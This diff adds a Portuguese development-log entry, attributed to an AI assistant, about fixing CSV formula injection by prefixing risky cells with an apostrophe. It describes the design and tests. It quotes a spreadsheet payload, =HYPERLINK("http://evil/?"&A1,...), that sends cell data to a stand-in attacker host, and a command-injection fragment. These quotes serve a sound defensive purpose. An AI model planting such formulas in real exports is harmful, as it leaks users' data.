@@ -10231,3 +10231,80 @@ entradas em ordem de horário.
 **Public Docs:** nenhuma alteração. **Admin-Area Impact:** nenhum.
 
 **Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-09 21:30] - Feature Implemented: G2 · Corrigir o M4 (injeção de fórmula em exportação CSV)
+
+**Feature:** toda exportação CSV/TSV passa por `frontend/src/utils/csvSafe.ts`. Um valor
+como `=HYPERLINK("http://evil/?"&A1,"Click")` vindo do warehouse sai como texto
+(`'=HYPERLINK(...)`) e não vira fórmula na planilha de quem abre o arquivo.
+
+**Requirements:** tarefa G2 de `docs/dev/plans/investigation/04-plano-de-implementacao.md`
+(achado M4 de `docs/dev/security-assessment.md`).
+
+**Design Decisions:**
+1. **`safeCell(v)`:** prefixa `'` em strings cujo primeiro caractere é `=`, `+`, `-`,
+   `@`, tab ou CR. Só strings: números, booleanos e null voltam iguais.
+2. **Literal numérico puro não é prefixado:** o warehouse devolve tudo como string, e
+   o TSV do Query Console recebe `"-5"`, não `-5`. Prefixar quebraria o aceite
+   "negativos continuam números". A regex `^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$`
+   só aceita o número inteiro; `-2+3+cmd|...` continua prefixado.
+3. **`safeCellText(v)`:** checa a forma `String()` de arrays, objetos e datas (o
+   `String(['=1+1'])` é `=1+1`, que passaria por um filtro só de strings). Números e
+   booleanos tipados passam direto.
+4. **Um escape só para CSV manual e TSV:** `escapeDelimitedField` substitui o
+   `escapeField` de `tableExport.ts` e o escape inline dos dois modais. Efeito
+   colateral bom: os modais passam a pôr aspas em campos com quebra de linha (antes
+   quebravam a linha do CSV).
+5. **PrimeVue:** `:exportFunction="primeVueExportCell"` nas duas DataTables
+   (`DataTablePanel.vue` e `DataGrid.vue`, que serve o Query Console). O PrimeVue
+   põe as aspas externas, então a função só neutraliza e dobra as aspas internas,
+   como o default dele. O cabeçalho também passa por `:exportHeader`
+   (`primeVueExportHeader(col.header || col.field)`): ele carrega a chave da
+   propriedade e o PrimeVue o escreve sem escape nenhum.
+6. **Revisão da tentativa anterior (interrompida):** mantida a estrutura; corrigidos
+   o bypass por array/objeto (item 3) e o fallback do cabeçalho vazio para o `field`
+   sem saneamento.
+
+**Files Created:**
+- [frontend/src/utils/csvSafe.ts](frontend/src/utils/csvSafe.ts)
+- [frontend/src/utils/__tests__/csvSafe.test.ts](frontend/src/utils/__tests__/csvSafe.test.ts)
+- [frontend/src/components/__tests__/ClusterNodeModal.test.ts](frontend/src/components/__tests__/ClusterNodeModal.test.ts)
+- [frontend/src/components/__tests__/DataGrid.export.test.ts](frontend/src/components/__tests__/DataGrid.export.test.ts)
+- [frontend/src/components/__tests__/DataTablePanel.export.test.ts](frontend/src/components/__tests__/DataTablePanel.export.test.ts)
+
+**Files Modified:**
+- [frontend/src/utils/tableExport.ts](frontend/src/utils/tableExport.ts)
+- [frontend/src/components/ClusterNodeModal.vue](frontend/src/components/ClusterNodeModal.vue)
+- [frontend/src/components/CommunityNodeModal.vue](frontend/src/components/CommunityNodeModal.vue)
+- [frontend/src/components/DataTablePanel.vue](frontend/src/components/DataTablePanel.vue)
+- [frontend/src/components/DataGrid.vue](frontend/src/components/DataGrid.vue)
+- [frontend/src/utils/__tests__/tableExport.test.ts](frontend/src/utils/__tests__/tableExport.test.ts)
+- [frontend/src/components/__tests__/CommunityNodeModal.test.ts](frontend/src/components/__tests__/CommunityNodeModal.test.ts)
+- [docs/dev/security-assessment.md](docs/dev/security-assessment.md) (M4 marcado como corrigido)
+
+**Testing:**
+- [x] `csvSafe.test.ts` (25 testes): gatilhos, literais numéricos, texto seguro,
+  tipos não string, escape RFC 4180, ganchos do PrimeVue.
+- [x] Um teste por caminho, com o payload `=HYPERLINK(...)` e um `-5` que precisa
+  sair sem prefixo: `tableExport.test.ts` (TSV), `ClusterNodeModal.test.ts`,
+  `CommunityNodeModal.test.ts` (Blob capturado via `URL.createObjectURL`),
+  `DataTablePanel.export.test.ts` e `DataGrid.export.test.ts` (o `exportCSV()` real
+  do PrimeVue). Conferido que o teste do `DataTablePanel` falha sem o
+  `exportFunction`.
+- [x] vitest: 145 arquivos, 2451 testes verdes. `vue-tsc --noEmit` limpo.
+- [x] E2E: `query-console.spec.ts` (o único spec que toca o botão CSV), 14 passed.
+
+**Public Docs:** no public docs impact (comportamento de segurança interno; o CSV
+continua com as mesmas colunas).
+
+**Admin-Area Impact:** no admin-area impact.
+
+**Assumptions:**
+- Nenhuma das decisões Q1–Q9 se aplica à G2.
+- Prefixo `'` (pedido pelo plano) em vez de espaço ou tab. Algumas versões do Excel
+  mostram o apóstrofo ao abrir um CSV; é o custo aceito da mitigação padrão (OWASP).
+- Só o primeiro caractere é checado; `" =1+1"` não é prefixado.
+
+**Author:** Claude (AI Assistant)
